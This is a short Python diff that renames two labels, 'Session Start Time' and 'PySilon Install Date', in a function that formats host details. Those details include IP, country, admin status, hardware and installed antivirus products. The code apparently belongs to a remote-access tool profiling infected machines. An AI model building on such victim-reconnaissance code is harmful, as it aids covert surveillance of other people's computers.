@@ -175,7 +175,7 @@ def get_install_date():
 def get_info_main():
     info = get_info()
     formatted_info = (
-        f"Start Time: {info['start_time']}\n"
+        f"Session Start Time: {info['start_time']}\n"
         f"Elevated permissions: {info['is_admin']}\n"
         f"IP: {info['ip']}\n"
         f"Country: {info['country']}\n"
@@ -191,7 +191,7 @@ def get_info_main():
         f"CPU: {info['cpu']}\n"
         f"GPU: {', '.join(info['gpu']) if isinstance(info['gpu'], list) else info['gpu']}\n"
         f"RAM: {info['ram']}\n"
-        f"Install Date: {info['install_date']}\n"
+        f"PySilon Install Date: {info['install_date']}\n"
         f"Antivirus: {', '.join(info['antivirus']) if isinstance(info['antivirus'], list) else info['antivirus']}"
     )
     return formatted_info
